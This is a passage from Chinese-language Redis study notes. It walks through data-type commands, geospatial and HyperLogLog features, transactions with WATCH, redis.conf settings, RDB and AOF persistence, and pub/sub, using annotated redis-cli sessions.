：移除list集合中指定个数的value，精确匹配\nltrim：通过下标截取指定的长度，此时lis列表变为截取下来的元素\n```shell\n127.0.0.1:6379> LRANGE list 0 -1 \n1) \"three\" \n2) \"three\" \n3) \"two\" \n4) \"one\"\n5) \"four\"\n6) \"four\"\n127.0.0.1:6379> lrem list 1 three # 移除list列表中1个值为three的元素\n(integer) 1 \n127.0.0.1:6379> LRANGE list 0 -1 \n1) \"three\" \n2) \"two\" \n3) \"one\"\n4) \"four\"\n5) \"four\"\n127.0.0.1:6379> lrem list 2 four # 移除list列表中2个值为four的元素\n(integer) 1 \n127.0.0.1:6379> LRANGE list 0 -1 \n1) \"three\" \n2) \"two\" \n3) \"one\"\n\n127.0.0.1:6379> ltrim list 1 2 # 截取list列表中[1,2]区间的元素\nOK\n127.0.0.1:6379> LRANGE list 0 -1 \n1) \"two\" \n2) \"one\"\n```\n\n## Set类型\nset类型是无序不重复集合。\n**所有的set命令都是用s开头的**\n\n**sadd、smemebers、sismember、scard、srem、srandmember、spop、smove**\n```shell\n127.0.0.1:6379> sadd myset \"hello\" # 向myset集合中添加hello\n(integer) 1\n127.0.0.1:6379> sadd myset \"kuangshen\" \n(integer) 1 \n127.0.0.1:6379> sadd myset \"lovekuangshen\" \n(integer) 1\n\n127.0.0.1:6379> SMEMBERS myset # 查看myset集合中的所有值 \n1) \"hello\" \n2) \"lovekuangshen\" \n3) \"kuangshen\"\n\n127.0.0.1:6379> SISMEMBER myset hello # 判断某一个值是不是在myset集合中！ \n(integer) 1 \n127.0.0.1:6379> SISMEMBER myset world \n(integer) 0\n\n127.0.0.1:6379> scard myset # 获取myset集合中的内容元素个数！ \n(integer) 4\n\n127.0.0.1:6379> srem myset hello # 移除myset集合中的指定元素 \n(integer) 1 \n127.0.0.1:6379> SMEMBERS myset \n1) \"lovekuangshen2\" \n2) \"lovekuangshen\" \n3) \"kuangshen\"\n\n127.0.0.1:6379> SRANDMEMBER myset # 从myset集合中随机抽选出一个元素 \n\"kuangshen\"\n127.0.0.1:6379> SRANDMEMBER myset 2 # 从myset集合中随机抽选出2个元素 \n1) \"lovekuangshen\" \n2) \"lovekuangshen2\"\n\n127.0.0.1:6379> spop myset # 随机删除myset集合中的一个元素\n\"lovekuangshen2\"\n127.0.0.1:6379> SMEMBERS myset \n1) \"lovekuangshen\" \n2) \"kuangshen\"\n\n\n127.0.0.1:6379> smove myset myset2 \"kuangshen\" # 将myset集合中的kuangsheng元素移动到myset2集合中\n(integer) 1\n```\n\n**sdiff、sinter、sunion**\n```shell\n127.0.0.1:6379> SDIFF mylist1 mylist2 # 求mylist1集合与mylist2集合之间的差集\n1) \"b\" \n2) \"a\" \n127.0.0.1:6379> SINTER mylist1 mylist2 # 求mylist1集合与mylist2集合之间的交集 \n1) \"c\" \n127.0.0.1:6379> SUNION mylist1 mylist2 # 求mylist1集合与mylist2集合之间的交集 \n1) \"b\" \n2) \"c\" \n3) \"e\" \n4) \"a\"\n5) \"d\"\n```\n\n## Hash类型\nhash类型的值为map集合\n**所有的hash命令都是用h开头的**\n\n**hset、hget、hmset、hgetall、hdel、hlen、hexists、hkeys、hvals**\n```shell\n127.0.0.1:6379> hset myhash field1 kuangshen # 向myhash中添加一个key为field1，value为kuangshen的元素\n(integer) 1\n127.0.0.1:6379> hget myhash field1 # 获取myhash中key为field1的value\n\"kuangshen\"\n\n127.0.0.1:6379> hmset myhash field1 hello field2 world # set多个值\nOK\n127.0.0.1:6379> hmget myhash field1 field2 # 获取多个字段值 \n1) \"hello\" \n2) \"world\"\n\n\n127.0.0.1:6379> hgetall myhash # 获取全部的数据， \n1) \"field1\" \n2) \"hello\" \n3) \"field2\" \n4) \"world\"\n\n127.0.0.1:6379> hdel myhash field1 # 删除myhash中指定key字段！对应的value值也就消失了\n(integer) 1 \n127.0.0.1:6379> hgetall myhash \n1) \"field2\" \n2) \"world\"\n\n127.0.0.1:6379> hlen myhash # 获取myhash表的字段数量！ \n(integer) 1\n\n127.0.0.1:6379> HEXISTS myhash field2 # 判断myhash中指定字段是否存在！ \n(integer) 1 \n127.0.0.1:6379> HEXISTS myhash field3 \n(integer) 0\n\n127.0.0.1:6379> hkeys myhash # 只获得所有field \n1) \"field2\" \n127.0.0.1:6379> hvals myhash # 只获得所有value \n1) \"world\" \n```\n\n**hincrby、hdecrby、hsetnx**\n```shell\n127.0.0.1:6379> hset myhash field3 5 \n(integer) 1 \n127.0.0.1:6379> HINCRBY myhash field3 1 \n(integer) 6 \n127.0.0.1:6379> hdecrby myhash field3 -1 \n(integer) 5 \n\n127.0.0.1:6379> hsetnx myhash field4 hello # 如果不存在则可以设置 \n(integer) 1 \n127.0.0.1:6379> hsetnx myhash field4 world # 如果存在则不能设置\n(integer) 0\n```\n\n## Zset类型\n有序集合, 在set基础上添加了一个socre属性，我们可以根据这个score属性来排序\n**zadd、zrange、zrevrange、zrangebyscore、zrem、zcount**\n```shell\n127.0.0.1:6379> zadd salary 2500 xiaohong # 向salary中添加一个score为2500的xiaohong元素\n(integer) 1 \n127.0.0.1:6379> zadd salary 5000 zhangsan 500 kaungshen   # 一次添加多个\n(integer) 2\n\n127.0.0.1:6379> ZRANGE myset 0 -1 # 按score从小到大输出所有元素\n1) \"kaungshen\"\n2) \"xiaohong\"\n3) \"zhangsan\"\n127.0.0.1:6379> ZRANGE salary 1 2 # 按socre从小到大输出[1,2]内的元素\n1) \"xiaohong\"\n2) \"zhangsan\"\n127.0.0.1:6379> ZREVRANGE salary 0 -1 # 按score从大到小输出所有元素\n1) \"zhangsan\"\n2) \"xiaohong\"\n3) \"kaungshen\"\n\n127.0.0.1:6379> ZRANGEBYSCORE salary -inf 2500  # 显示工资小于2500员工的升序排序！ \n1) \"kaungshen\" \n2) \"xiaohong\"\n\n127.0.0.1:6379> ZRANGEBYSCORE salary -inf 2500 withscores # 显示工资小于2500员工的升序排序！ 并且附带score\n1) \"kaungshen\" \n2) \"500\" \n3) \"xiaohong\" \n4) \"2500\"\n\n127.0.0.1:6379> zcard salary # 获取有序集合中的个数 \n(integer) 3\n127.0.0.1:6379> zcount salary -inf 2500 # 获取指定score在(-inf, 2500]区间内的成员数量！\n(integer) 2 \n\n127.0.0.1:6379> zrem salary xiaohong # 移除有序集合中的指定元素 \n(integer) 1 \n127.0.0.1:6379> zrange salary 0 -1 \n1) \"kaungshen\" \n2) \"zhangsan\" \n```\n\n# redis三种特殊数据类型\n## Geospatial 地理位置\n朋友的定位，附近的人，打车距离计算？\nRedis 的 Geo 在Redis3.2 版本就推出了！ 这个功能可以推算地理位置的信息，两地之间的距离，方圆\n几里有哪些人\n\n这个Geospatial类型只有6个命令，且全部以geo开头\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133029.png)\n\n**geoadd**\n getadd命令为添加地理位置\n ```shell\n127.0.0.1:6379> geoadd china:city 116.40 39.90 beijing # 往china:city中添加beijing，经度为116.40, 经度为39.90\n(integer) 1 \n127.0.0.1:6379> geoadd china:city 121.47 31.23 shanghai \n(integer) 1 \n127.0.0.1:6379> geoadd china:city 106.50 29.53 chongqi 114.05 22.52 shengzhen \n(integer) 2 \n127.0.0.1:6379> geoadd china:city 120.16 30.24 hangzhou 108.96 34.26 xian \n(integer) 2\n ```\n\n**geopos**\n```shell\n127.0.0.1:6379> GEOPOS china:city beijing # 获取指定的城市的经度和纬度！ \n1) 1) \"116.39999896287918091\" \n   2) \"39.90000009167092543\" \n127.0.0.1:6379> GEOPOS china:city beijing chongqi \n1) 1) \"116.39999896287918091\" \n   2) \"39.90000009167092543\" \n2) 1) \"106.49999767541885376\" \n   2) \"29.52999957900659211\"\n```\n\n**geodist**\n```shell\n127.0.0.1:6379> GEODIST china:city beijing shanghai km # 查看上海到北京的直线距离,以km为单位\n\"1067.3788\" \n127.0.0.1:6379> GEODIST china:city beijing chongqi km # 查看重庆到北京的直线距离 \n\"1464.0708\"\n```\n\n**georadius**\n```shell\n127.0.0.1:6379> GEORADIUS china:city 110 30 1000 km # 以110，30 这个经纬度为中心，寻找方圆1000km内的城市 \n1) \"chongqi\" \n2) \"xian\" \n3) \"shengzhen\" \n4) \"hangzhou\" \n127.0.0.1:6379> GEORADIUS china:city 110 30 500 km \n1) \"chongqi\" \n2) \"xian\" \n127.0.0.1:6379> GEORADIUS china:city 110 30 500 km withdist # 显示到中间距离的位置 \n1) 1) \"chongqi\" \n   2) \"341.9374\" \n2) 1) \"xian\" \n   2) \"483.8340\" \n127.0.0.1:6379> GEORADIUS china:city 110 30 500 km withcoord # 显示他人的定位信息 \n1) 1) \"chongqi\" \n   2) 1) \"106.49999767541885376\" \n      2) \"29.52999957900659211\" \n2) 1) \"xian\" \n   2) 1) \"108.96000176668167114\" \n      2) \"34.25999964418929977\" \n127.0.0.1:6379> GEORADIUS china:city 110 30 500 km withdist withcoord count 1 # 筛选出指定的结果！ \n1) 1) \"chongqi\" \n   2) \"341.9374\" \n   3) 1) \"106.49999767541885376\" \n      2) \"29.52999957900659211\" \n127.0.0.1:6379> GEORADIUS china:city 110 30 500 km withdist withcoord count 2 \n1) 1) \"chongqi\" \n   2) \"341.9374\" \n   3) 1) \"106.49999767541885376\" \n      2) \"29.52999957900659211\" \n2) 1) \"xian\" \n   2) \"483.8340\" \n   3) 1) \"108.96000176668167114\" \n      2) \"34.25999964418929977\"\n```\n\n**georadiusbymember**\n```shell\n## 找出位于指定元素周围的其他元素！ \n127.0.0.1:6379> GEORADIUSBYMEMBER china:city beijing 1000 km # 找出以beijing为中心，方圆1000km内的城市\n1) \"beijing\" \n2) \"xian\" \n127.0.0.1:6379> GEORADIUSBYMEMBER china:city shanghai 400 km \n1) \"hangzhou\" \n2) \"shanghai\"\n```\n\n**geohash**\n```shell\n127.0.0.1:6379> geohash china:city beijing chongqi # 将二维的经纬度转换为一维的字符串，如果两个字符串越接近，那么则距离越近！ \n1) \"wx4fbxxfke0\" \n2) \"wm5xzrybty0\"\n```\n\n注：GEO 底层的实现原理其实就是 Zset！我们可以使用Zset命令来操作geo！\n```shell\n127.0.0.1:6379> ZRANGE china:city 0 -1 # 查看地图中全部的元素 \n1) \"chongqi\" \n2) \"xian\" \n3) \"shengzhen\" \n4) \"hangzhou\" \n5) \"shanghai\" \n6) \"beijing\" \n127.0.0.1:6379> zrem china:city beijing # 移除指定元素！ \n(integer) 1 \n127.0.0.1:6379> ZRANGE china:city 0 -1 \n1) \"chongqi\" \n2) \"xian\" \n3) \"shengzhen\" \n4) \"hangzhou\" \n5) \"shanghai\"\n```\n\n## Hyperloglog\nRedis 2.8.9 版本就更新了 Hyperloglog 数据结构！, Hyperloglog是专门用来统计基数(不重复的元素)\n优点：占用的内存是固定，统计2^64 不同的元素，只需要废 12KB内存！如果要从内存角度来比较的话 Hyperloglog 首选！\n\n不过Hyperloglog有0.81%错误率\n如果允许容错，那么可以使用 Hyperloglog ！\n如果不允许容错，就使用 set 或者自己的数据类型即可\n\n**pfadd、pfcount、pfmerge**\n```shell\n127.0.0.1:6379> PFADD mykey a b c d d e # 创建第一组元素mykey\n(integer) 1\n127.0.0.1:6379> PFCOUNT mykey # 统计 mykey 元素的基数数量\n(integer) 5\n127.0.0.1:6379> PFADD mykey1 a f g # 创建第二组元素 mykey1\n(integer) 1\n127.0.0.1:6379> PFCOUNT mykey1\n(integer) 3\n127.0.0.1:6379> PFMERGE mykey3 mykey mykey1 # 合并两组 mykey mykey1 => mykey3 并集\nOK\n127.0.0.1:6379> PFCOUNT mykey3\n(integer) 7\n```\n\n## Bitmap\nBitmap 位图数据结构！ 操作二进制位来进行记录，就只有0 和 1 两个状态！\n\n**setbit、getbit、bitcount**\n```shell\n127.0.0.1:6379> SETBIT sign 0 1 # 将sign的二进制第0位设置成1\n(integer) 0\n127.0.0.1:6379> SETBIT sign 2 0 # 将sign的二进制第2位设置成0\n(integer) 0\n127.0.0.1:6379> setbit sign 1 1\n(integer) 0\n\n127.0.0.1:6379> GETBIT sign 0 # 获取sign的二进制的第0位数据\n(integer) 1\n127.0.0.1:6379> GETBIT sign 2\n(integer) 0\n\n127.0.0.1:6379> BITCOUNT sign # 获取sign的二进制中有多少个1\n(integer) 2\n```\n\n# Redis事务\nRedis事务相关命令：\n- MULTI ：开启事务，redis会将后续的命令逐个放入队列中，然后使用EXEC命令来原子化执行这个命令系列。\n- EXEC：执行事务中的所有操作命令。\n- DISCARD：取消事务，放弃执行事务块中的所有命令。\n- WATCH：监视一个或多个key,如果事务在执行前，这个key(或多个key)被其他命令修改，则事务被中断，不会执行事务中的任何命令。\n- UNWATCH：取消WATCH对所有key的监视。\n\nredis的事务：\n- 开启事务（multi）\n- 命令入队（......）\n- 执行事务（exec）\n\n下面具体看一下事务命令的使用：\n**正常执行事务**\n```shell\n127.0.0.1:6379> multi # 开启事务 \nOK\n# 命令入队 \n127.0.0.1:6379> set k1 v1\nQUEUED \n127.0.0.1:6379> set k2 v2 \nQUEUED \n127.0.0.1:6379> get k2 \nQUEUED \n127.0.0.1:6379> set k3 v3 \nQUEUED \n127.0.0.1:6379> exec # 执行事务 \n1) OK \n2) OK \n3) \"v2\" \n4) OK\n```\n\n**放弃事务！**\n```shell\n127.0.0.1:6379> multi # 开启事务 \nOK\n127.0.0.1:6379> set k1 v1 \nQUEUED \n127.0.0.1:6379> set k2 v2 \nQUEUED \n127.0.0.1:6379> set k4 v4 \nQUEUED 127.0.0.1:6379> DISCARD # 取消事务 OK\n127.0.0.1:6379> get k4 # 事务队列中命令都不会被执行！ \n(nil)\n```\n\n**编译型异常（代码有问题！ 命令有错！） ，事务中所有的命令都不会被执行！**\n```shell\n127.0.0.1:6379> multi OK\n127.0.0.1:6379> set k1 v1 \nQUEUED \n127.0.0.1:6379> set k2 v2 \nQUEUED \n127.0.0.1:6379> set k3 v3 \nQUEUED \n127.0.0.1:6379> getset k3 # 错误的命令 \n(error) ERR wrong number of arguments for 'getset' command \n127.0.0.1:6379> set k4 v4 \nQUEUED \n127.0.0.1:6379> set k5 v5 \nQUEUED \n127.0.0.1:6379> exec # 执行事务报错！ \n(error) EXECABORT Transaction discarded because of previous errors. \n127.0.0.1:6379> get k5 # 所有的命令都不会被执行！ \n(nil)\n```\n\n**运行时异常， 如果事务队列中存在语法性，那么执行命令的时候，其他命令是可以正常执行的，错误命令抛出异常！**\n```shell\n127.0.0.1:6379> set k1 \"v1\" \nOK\n127.0.0.1:6379> multi \nOK\n127.0.0.1:6379> incr k1 # 执行的时候会失败！ \nQUEUED \n127.0.0.1:6379> set k2 v2 \nQUEUED \n127.0.0.1:6379> set k3 v3 \nQUEUED \n127.0.0.1:6379> get k3 \nQUEUED \n127.0.0.1:6379> exec \n1) (error) ERR value is not an integer or out of range # 虽然第一条命令报错了，但是 依旧正常执行成功了！ \n2) OK \n3) OK \n4) \"v3\" \n127.0.0.1:6379> get k2 \n\"v2\" \n127.0.0.1:6379> get k3 \n\"v3\"\n```\n\n**为什么Redis不支持事务回滚？**\n以上两个例子总结出，多数事务失败是由语法错误或者数据结构类型错误导致的，语法错误说明在命令入队前就进行检测的，而类型错误是在执行时检测的，Redis为提升性能而采用这种简单的事务，这是不同于关系型数据库的，特别要注意区分。\n\n## watch监视（面试常问）\n可以使用watch来实现redis的乐观锁操作\n**事务执行时，watch监视的对象没有发生变化时**\n```shell\n127.0.0.1:6379> set money 100 \nOK\n127.0.0.1:6379> set out 0 \nOK\n127.0.0.1:6379> watch money # 监视 money 对象 \nOK\n127.0.0.1:6379> multi # 事务正常结束，数据期间没有发生变动，这个时候就正常执行成功！ \nOK\n127.0.0.1:6379> DECRBY money 20 \nQUEUED \n127.0.0.1:6379> INCRBY out 20 \nQUEUED \n127.0.0.1:6379> exec \n1) (integer) 80 \n2) (integer) 20\n```\n\n\n**事务执行时，watch监视的对象被另一个线程修改时**\n```shell\n127.0.0.1:6379> watch money # 监视 money \nOK\n127.0.0.1:6379> multi \nOK\n127.0.0.1:6379> DECRBY money 10 \nQUEUED \n127.0.0.1:6379> INCRBY out 10 \nQUEUED \n127.0.0.1:6379> exec # 执行之前，由于另外一个线程，修改了我们的值，这个时候，就会导致事务执行失败！\n(nil)\n```\n\n如果修改失败，获取最新的值就好\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133039.png)\n\n\n# Redis.conf详解\n**设置单位大小**\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133056.png)\n\n**引入外部配置文件**\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133109.png)\n\n**有关网络的设置**\n```conf\nbind 127.0.0.1 # 绑定的ip \nprotected-mode yes # 保护模式 \nport 6379 # 端口设置\n```\n\n**通用General设置**\n```conf\ndaemonize yes # 以守护进程的方式运行，默认是 no，我们需要自己开启为yes！ \n\npidfile /var/run/redis_6379.pid # 如果以后台的方式运行，我们就需要指定一个 pid 文件！ \n\n# 日志 \n# Specify the server verbosity level. \n# This can be one of:\n# debug (a lot of information, useful for development/testing) \n# verbose (many rarely useful info, but not a mess like the debug level) \n# notice (moderately verbose, what you want in production probably)\n# warning (only very important / critical messages are logged) \nloglevel notice logfile \"\" # 日志的文件位置名 \ndatabases 16 # 数据库的数量，默认是 16 个数据库 \n```\n\n**有关快照设置**\n```conf\n# 如果900s内，如果至少有一个1 key进行了修改，我们及进行持久化操作 \nsave 900 1 \n# 如果300s内，如果至少10 key进行了修改，我们及进行持久化操作 \nsave 300 10 \n# 如果60s内，如果至少10000 key进行了修改，我们及进行持久化操作 \nsave 60 10000 \n\nstop-writes-on-bgsave-error yes # 持久化如果出错，是否还需要继续工作！ \nrdbcompression yes # 是否压缩 rdb 文件，需要消耗一些cpu资源！ \nrdbchecksum yes # 保存rdb文件的时候，进行错误的检查校验！ \ndir ./ # rdb 文件保存的目录！\n```\n\n**有关安全的设置**\n可以再配置文件中设置\n```conf\nrequirepass \"whz\" # 设置redis的密码为whz\n```\n设置完成后，我们需要使用auth命令登陆后，才能操作redis中的数据\n```shell\n127.0.0.1:6379> ping \n(error) NOAUTH Authentication required. \n127.0.0.1:6379> auth whz # 使用密码进行登录！ \nOK\n```\n\n**内存、用户限制**\n```conf\nmaxclients 10000 # 设置能连接上redis的最大客户端的数量 \n\nmaxmemory <bytes> # redis 配置最大的内存容量 \n\nmaxmemory-policy noeviction # 内存到达上限之后的处理策略，有如下6种策略：\n                              1、volatile-lru：只对设置了过期时间的key进行LRU（默认值） \n                              2、allkeys-lru ： 删除lru算法的key \n                              3、volatile-random：随机删除即将过期key \n                              4、allkeys-random：随机删除 \n                              5、volatile-ttl ： 删除即将过期的 \n                              6、noeviction ： 永不过期，返回错误\n```\n\n**append only模式，aof配置**\n```conf\nappendonly no # 默认是不开启aof模式的，默认是使用rdb方式持久化的，在大部分所有的情况下， rdb完全够用！ \nappendfilename \"appendonly.aof\" # 持久化的文件的名字 \n\n# appendfsync always # 每次修改都会 sync。消耗性能 \nappendfsync everysec # 每秒执行一次 sync，可能会丢失这1s的数据！ \n# appendfsync no # 不执行 sync，这个时候操作系统自己同步数据，速度最快！\n```\n\n**通过命令行方式设置配置**\n```shell\n127.0.0.1:6379> config get requirepass # 获取redis的密码 \n1) \"requirepass\" \n2) \"\" \n127.0.0.1:6379> config set requirepass \"123456\" # 设置redis的密码\nOK\n127.0.0.1:6379> config get requirepass # 发现所有的命令都没有权限了 \n(error) NOAUTH Authentication required. \n127.0.0.1:6379> ping \n(error) NOAUTH Authentication required. \n127.0.0.1:6379> auth 123456 # 使用密码进行登录！ \nOK127.0.0.1:6379> config get requirepass \n1) \"requirepass\" \n2) \"123456\"\n```\n\n# Redis持久化\n面试和工作，持久化都是重点！\n\nRedis 是内存数据库，如果不将内存中的数据库状态保存到磁盘，那么一旦服务器进程退出，服务器中的数据库状态也会消失。所以Redis提供了2种持久化策略，分别是RDB(默认)与AOF\n\n## RDB(Redis DataBase)\nRDB其实就是把数据以快照的形式保存在磁盘上。什么是快照呢，你可以理解成把当前时刻的数据拍成一张照片保存下来。\n\nRDB持久化是指在指定的时间间隔内将内存中的数据集快照写入磁盘。也是默认的持久化方式，这种方式是就是将内存中数据以快照的方式写入到二进制文件中,默认的文件名为dump.rdb， 我们可以在配置文件种进行配置。\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133120.png)\n\n### 触发机制\n**1. save触发方式**\n该命令会阻塞当前Redis服务器，执行save命令期间，Redis不能处理其他命令，直到RDB过程完成为止。具体流程如下：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133131.png)\n执行完成时候如果存在老的RDB文件，就用新的替代掉旧的。我们的客户端可能都是几万或者是几十万，这种方式显然不可取。\n\n**2. bgsave触发方式**\n执行该命令时，Redis会在后台异步进行快照操作，快照同时还可以响应客户端请求。具体流程如下：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133142.png)\n具体操作是Redis进程执行fork操作创建子进程，RDB持久化过程由子进程负责，完成后自动结束。阻塞只发生在fork阶段，一般时间很短。基本上 Redis 内部所有的RDB操作都是采用 bgsave 命令。\n\n**3. 自动触发**\n自动触发是由我们的配置文件来完成的。在redis.conf配置文件中，里面有如下配置，我们可以去设置：\n- save：这里是用来配置触发 Redis的 RDB 持久化条件，也就是什么时候将内存中的数据保存到硬盘。比如“save m n”。表示m秒内数据集存在n次修改时，**自动触发bgsave**，而不是save。\n\n默认如下配置：\n```conf\n# 如果900s内，如果至少有一个1 key进行了修改，我们及进行持久化操作 \nsave 900 1 \n# 如果300s内，如果至少10 key进行了修改，我们及进行持久化操作 \nsave 300 10 \n# 如果60s内，如果至少10000 key进行了修改，我们及进行持久化操作 \nsave 60 10000 \n\nstop-writes-on-bgsave-error yes # 默认值为yes。当启用了RDB且最后一次后台保存数据失败，Redis是否停止接收数据。这会让用户意识到数据没有正确持久化到磁盘上，否则没有人会注意到灾难（disaster）发生了。如果Redis重启了，那么又可以重新开始接收数据了\n\nrdbcompression yes # 是否压缩 rdb 文件，需要消耗一些cpu资源！ \nrdbchecksum yes # 在存储快照后，我们还可以让redis使用CRC64算法来进行数据校验，但是这样做会增加大约10%的性能消耗，如果希望获取到最大的性能提升，可以关闭此功能。\ndir ./ # rdb 文件保存的目录！\n```\n\n**其他情况触发**\n- 执行 flushall 命令，也会触发我们的rdb规则！\n- 退出redis，也会产生 rdb 文件！\n\n\n**save与bgsave对比**\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133153.png)\n\n### 从rdb文件中恢复数据\nredis启动的时候会自动从配置文件中指定rdb存储目录中找dump.rdb文件， 然后从rdb文件中恢复其中的数据！\n\n### RDB 的优势和劣势\n优势：\n- RDB文件紧凑，全量备份，非常适合用于进行备份和灾难恢复。\n- 生成RDB文件的时候，redis主进程会fork()一个子进程来处理所有保存工作，主进程不需要进行任何磁盘IO操作。\n- RDB 在恢复大数据集时的速度比 AOF 的恢复速度要快。\n缺点：\nRDB快照是一次全量备份，存储的是内存数据的二进制序列化形式，存储上非常紧凑。当使用bgsave进行快照持久化时，会开启一个子进程专门负责快照持久化，子进程会拥有父进程的内存数据，父进程修改内存数据时，子进程不会反应出来，所以在快照持久化期间修改的数据不会被保存，可能丢失数据。\n\n\n## AOF机制\n全量备份总是耗时的，有时候我们提供一种更加高效的方式AOF，工作机制很简单，redis会将每一个收到的写命令都通过write函数追加到文件中。通俗的理解就是日志记录\n\nAof默认保存的是 appendonly.aof 文件，可以通过配置文件进行修改\naof默认是不开启的，我们需要手动进行配置！我们只需要将 appendonly 改为yes就开启了 aof！\n重启，redis 就可以生效了\n\n如果这个 aof 文件有错位，这时候 redis 是启动不起来的吗，我们需要修复这个aof文件\nredis 给我们提供了一个工具`redis-check-aof --fix`\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133213.png)\n如果文件正常，重启就可以直接恢复了！\n\n### 持久化原理\n他的原理看下面这张图：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133226.png)\n每当有一个写命令过来时，就直接保存在我们的AOF文件中。\n\n### 文件重写原理\nAOF的方式也同时带来了另一个问题。持久化文件会变的越来越大。\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133241.png)\n如果 aof 文件大于 64m，太大了！ fork一个新的进程来将我们的文件进行重写！\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133251.png)\n\n### AOF三种触发机制\n```conf\n# appendfsync always # 每次修改都会 sync。消耗性能 \nappendfsync everysec # 每秒执行一次 sync，可能会丢失这1s的数据！ \n# appendfsync no # 不执行 sync，这个时候操作系统自己同步数据，速度最快！\n```\n\n### AOF的优势和劣势\n优点：\n- AOF可以更好的保护数据不丢失\n- 一般AOF会每隔1秒，通过一个后台线程执行一次fsync操作，最多丢失1秒钟的数据。\n- AOF日志文件没有任何磁盘寻址的开销，写入性能非常高，文件不容易破损。\n- AOF日志文件即使过大的时候，出现后台重写操作，也不会影响客户端的读写。\n- AOF日志文件的命令通过非常可读的方式进行记录，这个特性非常适合做灾难性的误删除的紧急恢复。比如某人不小心用flushall命令清空了所有数据，只要这个时候后台rewrite还没有发生，那么就可以立即拷贝AOF文件，将最后一条flushall命令给删了，然后再将该AOF文件放回去，就可以通过恢复机制，自动恢复所有数据\n\n- 缺点：\n- 对于同一份数据来说，AOF日志文件通常比RDB数据快照文件更大，恢复的速度也比rdb慢\n- AOF开启后，支持的写QPS会比RDB支持的写QPS低，因为AOF一般会配置成每秒fsync一次日志文件，当然，每秒一次fsync，性能也还是很高的\n\n## 总结\n- RDB 持久化方式能够在指定的时间间隔内对你的数据进行快照存储\n- AOF 持久化方式记录每次对服务器写的操作，当服务器重启的时候会重新执行这些命令来恢复原始的数据，AOF命令以Redis 协议追加保存每次写的操作到文件末尾，Redis还能对AOF文件进行后台重写，使得AOF文件的体积不至于过大。\n- 只做缓存，如果你只希望你的数据在服务器运行的时候存在，你也可以不使用任何持久化\n- 同时开启两种持久化方式\n  - 在这种情况下，当redis重启的时候会优先载入AOF文件来恢复原始的数据，因为在通常情况下AOF文件保存的数据集要比RDB文件保存的数据集要完整。\n  - RDB 的数据不实时，同时使用两者时服务器重启也只会找AOF文件，那要不要只使用AOF呢？作者建议不要，因为RDB更适合用于备份数据库（AOF在不断变化不好备份），快速重启，而且不会有AOF可能潜在的Bug，留着作为一个万一的手段。\n- 性能建议\n  - 因为RDB文件只用作后备用途，建议只在Slave上持久化RDB文件，而且只要15分钟备份一次就够了，只保留 save 900 1 这条规则。\n  -  如果Enable AOF ，好处是在最恶劣情况下也只会丢失不超过两秒数据，启动脚本较简单只load自己的AOF文件就可以了，代价一是带来了持续的IO，二是AOF rewrite 的最后将 rewrite 过程中产生的新数据写到新文件造成的阻塞几乎是不可避免的。只要硬盘许可，应该尽量减少AOF rewrite的频率，AOF重写的基础大小默认值64M太小了，可以设到5G以上，默认超过原大小100%大小重写可以改到适当的数值。\n  - 如果不Enable AOF ，仅靠 Master-Slave Repllcation 实现高可用性也可以，能省掉一大笔IO，也减少了rewrite时带来的系统波动。代价是如果Master/Slave 同时倒掉，会丢失十几分钟的数据，启动脚本也要比较两个 Master/Slave 中的 RDB文件，载入较新的那个，微博就是这种架构。\n\n# Redis发布订阅\nRedis 发布订阅 (pub/sub) 是一种消息通信模式：发送者 (pub) 发送消息，订阅者 (sub) 接收消息。\n\nRedis 客户端可以订阅任意数量的频道。\n\n下图展示了频道 channel1 ， 以及订阅这个频道的三个客户端 —— client2 、 client5 和 client1 之间的关系：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133322.png)\n当有新消息通过 PUBLISH 命令发送给频道 channel1 时， 这个消息就会被发送给订阅它的三个客户端：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133333.png)\n\n**Redis 发布订阅命令， 下表列出了 redis 发布订阅常用命令：**\n|序号\t| 命令及描述|\n|--|--|\n|1 |\tPSUBSCRIBE pattern [pattern ...]  订阅一个或多个符合给定模式的频道。|\n|2 | PUBSUB subcommand [argument [argument ...]] 查看订阅与发布系统状态。|\n|3 |\tPUBLISH channel message 将信息发送到指定的频道。|\n|4 | PUNSUBSCRIBE [pattern [pattern ...]] 退订所有给定模式的频道。|\n|5 | SUBSCRIBE channel [channel ...] 订阅给定的一个或多个频道的信息。|\n|6\t| UNSUBSCRIBE [channel [channel ...]] 指退订给定的频道。|\n\n**实例**\n以下实例演示了发布订阅是如何工作的，需要开启两个 redis-cli 客户端。\n在我们实例中我们创建了订阅频道名为 runoobChat:\n```shell\n# 第一个 redis-cli 客户端\nredis 127.0.0.1:6379> SUBSCRIBE runoobChat\n\nReading messages... (press Ctrl-C to quit)\n1) \"subscribe\"\n2) \"redisChat\"\n3) (integer) 1\n# 等待读取推送的信息\n```\n现在，我们先重新开启个 redis 客户端，然后在同一个频道 runoobChat 发布两次消息，订阅者就能接收到消息。\n```shell\n# 第二个 redis-cli 客户端\nredis 127.0.0.1:6379> PUBLISH runoobChat \"Redis PUBLISH test\"\n(integer) 1\n\nredis 127.0.0.1:6379> PUBLISH runoobChat \"Learn redis by runoob.com\"\n(integer) 1\n\n# 订阅者的客户端会显示如下消息\n1) \"message\"  # 消息\n2) \"runoobChat\" # 是哪个频道的信息\n3) \"Redis PUBLISH test\" # 消息的具体内容\n1) \"message\"\n2) \"runoobChat\"\n3) \"Learn redis by runoob.com\"\n```\n\n**redis发布订阅原理**\n通过 SUBSCRIBE 命令订阅某频道后，redis-server 里维护了一个字典，字典的键就是一个个 频道！，而字典的值则是一个链表，链表中保存了所有订阅这个 channel 的客户端。SUBSCRIBE 命令的关键，就是将客户端添加到给定 channel 的订阅链表中。\n通过 PUBLISH 命令向订阅者发送消息，redis-server 